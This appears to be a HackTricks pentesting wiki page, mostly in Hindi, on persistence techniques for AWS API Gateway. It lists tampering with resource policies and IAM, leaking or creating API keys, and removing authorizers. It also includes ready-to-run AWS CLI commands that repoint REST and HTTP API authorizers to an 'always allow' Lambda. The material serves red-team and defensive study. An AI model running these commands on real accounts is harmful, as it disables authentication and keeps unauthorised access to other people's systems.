# AWS - API Gateway Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## API Gateway

For more information go to:

{{#ref}}
../../aws-services/aws-api-gateway-enum.md
{{#endref}}

### Resource Policy

API gateway(s) की resource policy को संशोधित करें ताकि आप स्वयं को उनके लिए एक्सेस दे सकें

### Modify Lambda Authorizers

lambda authorizers के code को संशोधित करें ताकि आप स्वयं को सभी endpoints तक पहुँच दे सकें।\
या बस authorizer का उपयोग हटा दें।

यदि आपके पास control-plane permissions हैं जिससे आप **create/update an authorizer** कर सकते हैं (REST API: `aws apigateway update-authorizer`, HTTP API: `aws apigatewayv2 update-authorizer`) तो आप **repoint the authorizer to a Lambda that always allows** भी कर सकते हैं।

REST APIs (changes typically require a deployment):
```bash
REGION="us-east-1"
REST_API_ID="<rest_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigateway update-authorizer --region "$REGION" --rest-api-id "$REST_API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
aws apigateway create-deployment --region "$REGION" --rest-api-id "$REST_API_ID" --stage-name "<stage>"
```
HTTP APIs / `apigatewayv2` (अक्सर तुरंत प्रभावी होते हैं):
```bash
REGION="us-east-1"
API_ID="<http_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigatewayv2 update-authorizer --region "$REGION" --api-id "$API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
```
### IAM Permissions

यदि कोई resource IAM authorizer का उपयोग कर रहा है, तो आप IAM permissions संशोधित करके स्वयं को उस तक पहुँच दे सकते हैं।\
या केवल authorizer के उपयोग को हटा दें।

### API Keys

यदि API keys का उपयोग हो रहा है, तो आप उन्हें leak करके persistence बनाए रख सकते हैं या नए API keys भी बना सकते हैं।\
या केवल API keys के उपयोग को हटा दें।

{{#include ../../../../banners/hacktricks-training.md}}
